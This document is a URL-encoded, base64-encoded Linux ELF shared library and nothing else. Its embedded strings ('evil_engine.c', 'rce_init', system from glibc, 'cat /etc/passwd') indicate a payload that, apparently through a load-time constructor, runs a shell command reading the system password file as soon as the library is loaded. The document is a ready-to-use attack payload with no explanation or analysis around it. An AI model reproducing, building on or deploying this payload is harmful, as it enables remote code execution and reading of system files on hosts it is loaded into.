AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXFLwAASIXAdAL%2F0EiDxAjDAAAAAAAAAAAA%2FzXKLwAA%2FyXMLwAADx9AAP8lyi8AAGgAAAAA6eD%2F%2F%2F%2F%2FJZovAABmkAAAAAAAAAAASI09uS8AAEiNBbIvAABIOfh0FUiLBV4vAABIhcB0Cf%2FgDx+AAAAAAMMPH4AAAAAASI09iS8AAEiNNYIvAABIKf5IifBIwe4%2FSMH4A0gBxkjR%2FnQUSIsFLS8AAEiFwHQI%2F+BmDx9EAADDDx+AAAAAAPMPHvqAPUUvAAAAdStVSIM9Ci8AAABIieV0DEiLPSYvAADoWf%2F%2F%2F+hk%2F%2F%2F%2FxgUdLwAAAV3DDx8Aww8fgAAAAADzDx766Xf%2F%2F%2F9VSInlSI0F7A4AAEiJx+gU%2F%2F%2F%2FkF3DAEiD7AhIg8QIwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABjYXQgL2V0Yy9wYXNzd2QAARsDOyQAAAADAAAAEPD%2F%2F0AAAAAw8P%2F%2FaAAAAPnw%2F%2F+AAAAAAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAACQAAAAcAAAAyO%2F%2F%2FyAAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAARAAAAMDv%2F%2F8IAAAAAAAAAAAAAAAcAAAAXAAAAHHw%2F%2F8WAAAAAEEOEIYCQw0GUQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEAAAAAAAAJEQAAAAAAAMAQAAAAAAAAAQAAAAAAAABcAAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAACARAAAAAAAAGQAAAAAAAADwPQAAAAAAABsAAAAAAAAAEAAAAAAAAAAaAAAAAAAAAAA+AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+%2F28AAAAAYAIAAAAAAAAFAAAAAAAAABADAAAAAAAABgAAAAAAAACAAgAAAAAAAAoAAAAAAAAAcgAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIAAAAAAAAAGAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABwBAAAAAAAAAcAAAAAAAAAsAMAAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAP7%2F%2F28AAAAAkAMAAAAAAAD%2F%2F%2F9vAAAAAAEAAAAAAAAA8P%2F%2FbwAAAACCAwAAAAAAAPn%2F%2F28AAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAAAIQAAAAAAAAEdDQzogKERlYmlhbiAxNC4yLjAtMTkpIDE0LjIuMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAIADABQEAAAAAAAAAAAAAAAAAAADgAAAAIADACAEAAAAAAAAAAAAAAAAAAAIQAAAAIADADAEAAAAAAAAAAAAAAAAAAANwAAAAEAFwAQQAAAAAAAAAEAAAAAAAAAQwAAAAEAEgAAPgAAAAAAAAAAAAAAAAAAagAAAAIADAAAEQAAAAAAAAAAAAAAAAAAdgAAAAEAEQDwPQAAAAAAAAAAAAAAAAAAlQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAowAAAAIADAAJEQAAAAAAABYAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEACwIAAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAugAAAAIADQAgEQAAAAAAAAAAAAAAAAAAwAAAAAEAFgAIQAAAAAAAAAAAAAAAAAAAzQAAAAEAEwAIPgAAAAAAAAAAAAAAAAAA1gAAAAAADwAQIAAAAAAAAAAAAAAAAAAA6QAAAAEAFgAQQAAAAAAAAAAAAAAAAAAA9QAAAAEAFQDoPwAAAAAAAAAAAAAAAAAApgAAAAIACQAAEAAAAAAAAAAAAAAAAAAACwEAACAAAAAAAAAAAAAAAAAAAAAAAAAAJwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAOgEAACAAAAAAAAAAAAAAAAAAAAAAAAAASQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAYwEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBldmlsX2VuZ2luZS5jAHJjZV9pbml0AF9fRlJBTUVfRU5EX18AX2ZpbmkAX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAHN5c3RlbUBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAAA4AgAAAAAAADgCAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v%2F%2FbwIAAAAAAAAAYAIAAAAAAABgAgAAAAAAABwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAIACAAAAAAAAgAIAAAAAAACQAAAAAAAAAAQAAAABAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAAAQAwAAAAAAABADAAAAAAAAcgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA%2F%2F%2F%2FbwIAAAAAAAAAggMAAAAAAACCAwAAAAAAAAwAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7%2F%2F28CAAAAAAAAAJADAAAAAAAAkAMAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAACwAwAAAAAAALADAAAAAAAAwAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAcAQAAAAAAABwBAAAAAAAABgAAAAAAAAAAwAAABUAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAgEAAAAAAAACAQAAAAAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAQBAAAAAAAABAEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAFAQAAAAAAAAUBAAAAAAAADPAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAAAgEQAAAAAAACARAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAABAgAAAAAAAAECAAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAAA4IAAAAAAAADggAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA8D0AAAAAAADwLQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAA+AAAAAAAAAC4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAAGAAAAAwAAAAAAAAAIPgAAAAAAAAguAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACCAAAAAQAAAAMAAAAAAAAAyD8AAAAAAADILwAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1AAAAAEAAAADAAAAAAAAAOg%2FAAAAAAAA6C8AAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAI